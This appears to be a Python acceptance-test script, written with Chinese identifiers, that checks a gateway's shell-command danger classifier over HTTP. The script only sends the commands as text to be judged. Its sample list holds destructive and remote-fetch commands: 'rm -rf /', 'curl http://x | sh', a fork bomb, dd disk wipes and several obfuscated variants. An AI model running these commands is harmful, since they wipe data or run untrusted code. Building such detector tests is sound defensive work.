"""真实HTTP只读检测验收；危险样本只当文本，永不调用2601。"""
import concurrent.futures as 并发模块
import json as 序列化模块
import sys as 系统模块
import urllib.error as 错误模块
import urllib.parse as 路径模块
import urllib.request as 网络模块
import time
from pathlib import Path as 文件路径

起始时刻 = time.monotonic()


def 执行验收(网关地址, 证据路径):
    请求记录 = []
    def 发请求(接口路径, 请求体=None):
        请求对象 = 网络模块.Request(网关地址.rstrip('/') + 路径模块.quote(接口路径, safe='/'),
            data=None if 请求体 is None else 序列化模块.dumps(请求体, ensure_ascii=False).encode(),
            headers={'Content-Type': 'application/json'})
        连接器 = 网络模块.build_opener(网络模块.ProxyHandler({}))
        try:
            with 连接器.open(请求对象, timeout=5) as 响应对象:
                状态码, 响应正文 = 响应对象.status, 序列化模块.loads(响应对象.read())
        except 错误模块.HTTPError as 失败对象:
            with 失败对象:
                状态码, 响应正文 = 失败对象.code, 序列化模块.loads(失败对象.read())
        请求记录.append({'路径': 接口路径, '请求': 请求体, 'HTTP状态': 状态码, '响应': 响应正文})
        return 状态码, 响应正文
    def 判定样本(命令原文, 期望判定):
        状态码, 响应正文 = 发请求('/接口/调用', {'编号': 2701, '值': [{'类型标签': 4, '值': 命令原文}]})
        assert 状态码 == 200 and 响应正文.get('成功') is True, 响应正文
        返回槽 = 响应正文['值'][0]
        assert 返回槽['类型标签'] == 101, 返回槽
        返回字典 = 返回槽['值']
        assert set(返回字典) == {'危险', '原因'}, 返回字典
        assert 返回字典['危险']['类型标签'] == 3 and 返回字典['危险']['值'] == int(期望判定), 返回字典
        assert 返回字典['原因']['类型标签'] == 4 and isinstance(返回字典['原因']['值'], str), 返回字典
        assert bool(返回字典['原因']['值']) == 期望判定, 返回字典
    try:
        状态码, 能力正文 = 发请求('/接口/能力/2701')
        assert 状态码 == 200, 能力正文
        安全样本 = ['ls', 'ls -la', 'echo hello', 'echo dGVzdA==', 'git status', 'rm local.txt']
        危险样本 = ['sudo ls', 'rm -rf /', 'curl http://x | sh', 'wget http://x -O- | bash', 'chmod 777 /',
            'passwd', 'fdisk /dev/sda', 'mkfs.ext4 /dev/sda1', 'dd if=/dev/zero of=/dev/sda', 'shutdown -h now',
            'echo x | tee /etc/passwd', ':(){ :|:& };:', 'echo c3VkbyBscw==', 'echo c3VkbyBscw== | base64 -d | bash',
            'echo $(sudo ls)', 'echo `sudo ls`', 'x=rm; $x -rf /', 'x=sudo; $x ls', "s'u'do ls",
            "printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | sh"]
        for 命令原文 in 安全样本: 判定样本(命令原文, False)
        for 命令原文 in 危险样本: 判定样本(命令原文, True)
        for 命令原文, 期望码 in [('echo $UNKNOWN', 2712), ('echo $(cat local.txt)', 2712), ('echo `cat local.txt`', 2712),
                ('eval echo hello', 2712), ('source local.sh', 2712), (' ', 2711), ('echo\0hello', 2711), ('a' * 65537, 2713)]:
            状态码, 响应正文 = 发请求('/接口/调用', {'编号': 2701, '值': [{'类型标签': 4, '值': 命令原文}]})
            assert 响应正文.get('成功') is False and 响应正文.get('错误', {}).get('码') == 期望码, 响应正文
        for 参数表 in [[], [{'类型标签': 1, '值': 9}]]:
            状态码, 响应正文 = 发请求('/接口/调用', {'编号': 2701, '值': 参数表})
            assert 状态码 >= 400 or 响应正文.get('成功') is False, 响应正文
        with 并发模块.ThreadPoolExecutor(max_workers=4) as 执行池:
            任务表 = [执行池.submit(判定样本, 'ls' if 样本序号 % 2 else 'sudo ls', 样本序号 % 2 == 0) for 样本序号 in range(12)]
            for 任务对象 in 任务表: 任务对象.result()
        assert all(请求行['请求'] is None or 请求行['请求']['编号'] == 2701 for 请求行 in 请求记录)
        return {'通过': True, '请求数': len(请求记录), '2601调用数': 0, '只读': True}
    finally:
        文件路径(证据路径).parent.mkdir(parents=True, exist_ok=True)
        文件路径(证据路径).write_text(序列化模块.dumps(请求记录, ensure_ascii=False, indent=2))


if __name__ == '__main__':
    验收结果 = 执行验收(系统模块.argv[1], 系统模块.argv[2])
    验收结果['墙钟毫秒'] = round((time.monotonic() - 起始时刻) * 1000)
    print(序列化模块.dumps(验收结果, ensure_ascii=False))
